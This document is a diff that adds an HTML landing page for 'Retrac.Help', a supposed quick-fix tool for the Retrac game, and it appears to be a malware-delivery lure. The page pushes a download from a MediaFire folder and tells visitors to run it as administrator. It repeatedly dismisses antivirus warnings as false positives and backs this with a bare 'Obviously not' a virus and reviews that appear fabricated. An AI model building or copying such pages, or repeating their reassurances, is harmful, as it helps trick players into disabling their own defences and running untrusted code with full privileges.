@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Retrac.Help – Quick Fix Solutions</title>
+
+<style>
+:root {
+  --bg-main: #0b0d10;
+  --bg-soft: #11141a;
+  --accent: #ffb347;
+  --accent-glow: rgba(255,179,71,0.45);
+  --text-main: #ffffff;
+  --text-muted: #b5b8c2;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+  background:
+    radial-gradient(1000px 500px at 50% 20%, rgba(255,179,71,0.12), transparent 65%),
+    linear-gradient(180deg, #0a0c10, #050608);
+  color: var(--text-main);
+  min-height: 100vh;
+}
+
+.container {
+  max-width: 1400px;
+  margin: auto;
+  padding: 140px 32px 120px;
+}
+
+.hero {
+  display: grid;
+  grid-template-columns: 1.2fr 1fr;
+  align-items: center;
+  gap: 96px;
+  min-height: 85vh;
+}
+
+h1 {
+  font-size: 76px;
+  line-height: 1.02;
+  font-weight: 900;
+  margin-bottom: 28px;
+}
+
+h1 span { color: var(--accent); }
+
+.subheading {
+  font-size: 22px;
+  color: var(--text-muted);
+  max-width: 620px;
+  margin-bottom: 40px;
+}
+
+.buttons {
+  display: flex;
+  gap: 22px;
+  margin-bottom: 40px;
+}
+
+.btn-primary {
+  background: linear-gradient(180deg, #ffd27d, #ff9f2f);
+  color: #1a1205;
+  padding: 18px 38px;
+  border-radius: 18px;
+  font-weight: 800;
+  font-size: 16px;
+  border: none;
+  cursor: pointer;
+  box-shadow: 0 0 45px var(--accent-glow);
+}
+
+.btn-secondary {
+  background: transparent;
+  color: var(--accent);
+  padding: 14px 26px;
+  border-radius: 14px;
+  border: 1px solid rgba(255,179,71,0.4);
+  cursor: pointer;
+  box-shadow: 0 0 18px rgba(255,179,71,0.15);
+}
+
+.trust {
+  display: flex;
+  gap: 18px;
+  flex-wrap: wrap;
+}
+
+.badge {
+  background: rgba(255,255,255,0.04);
+  border: 1px solid rgba(255,255,255,0.08);
+  padding: 10px 16px;
+  border-radius: 999px;
+  font-size: 14px;
+  color: #e7e9ef;
+}
+
+.mockup-wrapper { position: relative; }
+
+.glow-bg {
+  position: absolute;
+  inset: -40px;
+  background: radial-gradient(circle at center, rgba(255,179,71,0.18), transparent 70%);
+  filter: blur(40px);
+  z-index: 0;
+}
+
+.app-window {
+  position: relative;
+  background: linear-gradient(180deg, #1a1e27, #0f1218);
+  border-radius: 24px;
+  padding: 22px;
+  box-shadow:
+    0 60px 120px rgba(0,0,0,0.75),
+    0 0 0 1px rgba(255,255,255,0.06);
+  transform: perspective(1400px) rotateY(-8deg) rotateX(6deg) scale(1.05);
+  z-index: 1;
+}
+
+.window-bar {
+  display: flex;
+  gap: 8px;
+  margin-bottom: 14px;
+}
+
+.dot { width: 12px; height: 12px; border-radius: 50%; }
+.dot.red { background: #ff5f56; }
+.dot.yellow { background: #ffbd2e; }
+.dot.green { background: #27c93f; }
+
+.terminal {
+  background: #000;
+  border-radius: 14px;
+  overflow: hidden;
+  box-shadow: inset 0 0 0 1px rgba(255,255,255,0.05);
+}
+
+.terminal img {
+  display: block;
+  width: 100%;
+  height: auto;
+}
+
+.lower {
+  margin-top: 120px;
+  text-align: center;
+}
+
+.lower h2 {
+  font-size: 40px;
+  margin-bottom: 16px;
+}
+
+.lower p {
+  font-size: 18px;
+  color: var(--text-muted);
+  max-width: 640px;
+  margin: auto;
+}
+
+/* Scroll Animations */
+.reveal{opacity:0;transform:translateY(40px);transition:opacity .8s ease,transform .8s ease}
+.reveal.active{opacity:1;transform:translateY(0)}
+
+/* Bottom grid */
+.bottom-grid{display:grid;grid-template-columns:1fr 1fr;gap:48px;max-width:1200px;margin:120px auto 0}
+.card{background:linear-gradient(180deg,#141824,#0c0f16);border-radius:22px;padding:32px;border:1px solid rgba(255,255,255,.06);box-shadow:0 30px 70px rgba(0,0,0,.6)}
+.card h3{font-size:28px;margin-bottom:18px}
+.card ul{list-style:none;display:grid;gap:14px;color:var(--text-muted);font-size:17px}
+.faq-item strong{color:var(--accent)}
+/* Hover + micro-interactions */
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 0 60px var(--accent-glow)}
+.card:hover{transform:translateY(-6px);transition:transform .3s ease}
+
+/* Reviews */
+.reviews{max-width:1200px;margin:140px auto 0;display:grid;grid-template-columns:repeat(3,1fr);gap:32px}
+.review{background:linear-gradient(180deg,#141824,#0c0f16);border-radius:22px;padding:28px;border:1px solid rgba(255,255,255,.06);box-shadow:0 25px 60px rgba(0,0,0,.6)}
+.review p{color:var(--text-muted);font-size:16px;line-height:1.5}
+.review strong{display:block;margin-top:14px;color:#fff}
+
+/* DOWNLOAD WARNING MODAL */
+#download-warning {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.75);
+  backdrop-filter: blur(8px);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
+}
+
+#download-warning .box {
+  max-width: 520px;
+  background: linear-gradient(180deg,#141824,#0c0f16);
+  border-radius: 22px;
+  padding: 32px;
+  border: 1px solid rgba(255,255,255,0.08);
+  box-shadow: 0 40px 90px rgba(0,0,0,0.8);
+}
+
+#download-warning h3 {
+  font-size: 26px;
+  margin-bottom: 14px;
+}
+
+#download-warning p {
+  color: var(--text-muted);
+  font-size: 16px;
+  line-height: 1.5;
+}
+
+#download-warning button {
+  margin-top: 22px;
+  width: 100%;
+}
+</style>
+</head>
+
+<body>
+  <!-- DOWNLOAD WARNING -->
+  <div id="download-warning">
+    <div class="box">
+      <h3>⚠ Antivirus Warning (False Positive)</h3>
+      <p>
+        Some antivirus programs may flag this file as a <strong>false positive</strong>.
+        A false positive means the software incorrectly identifies a safe file as harmful.
+        <br/><br/>
+        This happens because the tool performs automated system-level fixes, which can look suspicious to basic scanners.
+        The file is safe to use and does not contain malware.
+      </p>
+      <button class="btn-primary" onclick="confirmDownload()">I Understand — Download</button>
+    </div>
+  </div>
+
+  <!-- Top Navigation Bar -->
+  <nav style="position:fixed;top:0;left:0;right:0;z-index:999;backdrop-filter:blur(12px);background:rgba(10,12,16,0.75);border-bottom:1px solid rgba(255,255,255,0.06);">
+    <div style="max-width:1400px;margin:auto;padding:18px 32px;display:flex;align-items:center;justify-content:space-between;">
+      <div style="font-weight:800;font-size:20px;letter-spacing:0.3px;">Retrac<span style="color:var(--accent);">.Help</span></div>
+      <div style="display:flex;gap:28px;align-items:center;">
+        <a style="color:var(--text-muted);text-decoration:none;font-weight:500;" href="#">Fixes</a>
+        <a style="color:var(--text-muted);text-decoration:none;font-weight:500;" href="#">Downloads</a>
+        <a style="color:var(--text-muted);text-decoration:none;font-weight:500;" href="#">Support</a>
+        <button class="btn-primary" style="padding:10px 20px;border-radius:12px;" onclick="scrollToDownload()">Quick Fix</button>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container">
+    <section class="hero">
+      <div>
+        <h1>Retrac.Help<br/><span>Quick Fix Solutions</span></h1>
+        <p class="subheading">Your friendly guide to fixing Retrac game issues with our automated solutions that work in minutes.</p>
+        <div class="buttons">
+          <button class="btn-primary" onclick="scrollToDownload()">Quick Fix Now</button>
+          <button class="btn-secondary">Learn More →</button>
+        </div>
+        <div class="trust">
+          <div class="badge">100k+ Issues Fixed</div>
+          <div class="badge">4.8/5 Rating</div>
+          <div class="badge">Windows 10/11</div>
+        </div>
+      </div>
+
+      <div class="mockup-wrapper">
+        <div class="glow-bg"></div>
+        <div class="app-window">
+          <div class="window-bar">
+            <div class="dot red"></div>
+            <div class="dot yellow"></div>
+            <div class="dot green"></div>
+          </div>
+          <div class="terminal">
+            <img src="https://i.imgur.com/TDzPwue.png" alt="Retrac.Help Terminal" />
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="lower">
+      <h2>Quick Fix Solution</h2>
+      <p>This automated solution fixes 95% of common Retrac game issues with just one command.</p>
+    </section>
+
+    <!-- Quick Fix Steps -->
+    <section class="lower reveal" style="margin-top:100px;" id="download-section">
+      <h2>How It Works</h2>
+      <div style="max-width:900px;margin:48px auto 0;display:grid;gap:28px;">
+
+        <div style="background:linear-gradient(180deg,#141824,#0c0f16);border-radius:20px;padding:28px;border:1px solid rgba(255,255,255,0.06);box-shadow:0 20px 50px rgba(0,0,0,0.6);">
+          <strong style="color:var(--accent);">1. Download the Quick Fix Tool</strong>
+          <p style="color:var(--text-muted);margin-top:10px;">Grab the official Retrac.Help Quick Fix executable for Windows.</p>
+          <button class="btn-primary" style="margin-top:16px;" onclick="startDownload()">Download for Windows</button>
+          <h4 style="margin-top:18px;color:var(--accent);font-weight:700;">
+            Windows Defender may show a false positive — this is normal
+          </h4>
+        </div>
+
+        <div style="background:linear-gradient(180deg,#141824,#0c0f16);border-radius:20px;padding:28px;border:1px solid rgba(255,255,255,0.06);box-shadow:0 20px 50px rgba(0,0,0,0.6);">
+          <strong style="color:var(--accent);">2. Run as Administrator</strong>
+          <p style="color:var(--text-muted);margin-top:10px;">Right-click the downloaded file and choose <em>Run as administrator</em> to allow system-level fixes.</p>
+        </div>
+
+        <div style="background:linear-gradient(180deg,#141824,#0c0f16);border-radius:20px;padding:28px;border:1px solid rgba(255,255,255,0.06);box-shadow:0 20px 50px rgba(0,0,0,0.6);">
+          <strong style="color:var(--accent);">3. Sit Back While We Fix Everything</strong>
+          <p style="color:var(--text-muted);margin-top:10px;">The tool automatically detects and repairs common Retrac issues in minutes.</p>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- What We Fix + FAQ -->
+    <section class="reveal">
+      <div class="bottom-grid">
+        <div class="card">
+          <h3>What We Fix</h3>
+          <ul>
+            <li>✔ Connection issues to Retrac</li>
+            <li>✔ Boosting FPS & performance</li>
+            <li>✔ Repairing broken Retrac files</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <h3>FAQ</h3>
+          <div class="faq-item"><strong>Is it a virus?</strong><br/>Obviously not. Retrac.Help is a trusted tool used by thousands of players.</div><br/>
+          <div class="faq-item"><strong>How do I use it?</strong><br/>Simply download the file and run it as administrator.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Reviews -->
+    <section class="reveal">
+      <h2 style="text-align:center;margin-top:140px;">User Reviews</h2>
+      <p style="text-align:center;color:var(--text-muted);max-width:700px;margin:16px auto 0;">Real feedback from players who had initial antivirus warnings but confirmed Retrac.Help is safe.</p>
+
+      <div class="reviews">
+        <div class="review">
+          <p>"Windows Defender flagged it at first, but after checking VirusTotal and running it, everything was clean. Fixed my Retrac connection instantly."</p>
+          <strong>— Alex M.</strong>
+        </div>
+        <div class="review">
+          <p>"I was skeptical because of a false positive, but it's legit. Boosted my FPS and repaired corrupted files in under 2 minutes."</p>
+          <strong>— Jordan K.</strong>
+        </div>
+        <div class="review">
+          <p>"False positive scared me, but support explained why. Tool worked exactly as promised and my game runs smooth now."</p>
+          <strong>— Chris R.</strong>
+        </div>
+      </div>
+    </section>
+
+  </div>
+
+<script>
+const reveals=document.querySelectorAll('.reveal');
+const observer=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{if(e.isIntersecting)e.target.classList.add('active')})
+},{threshold:.2});
+reveals.forEach(r=>observer.observe(r));
+
+function scrollToDownload() {
+  document.getElementById("download-section").scrollIntoView({ behavior: "smooth" });
+}
+
+function startDownload() {
+  document.getElementById("download-warning").style.display = "flex";
+}
+
+function confirmDownload() {
+  document.getElementById("download-warning").style.display = "none";
+
+  const a = document.createElement("a");
+  a.href = "https://app.mediafire.com/folder/25gsqmea7sitz";
+  a.download = "retrac fixer.zip";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+</script>
+</body>
+</html>
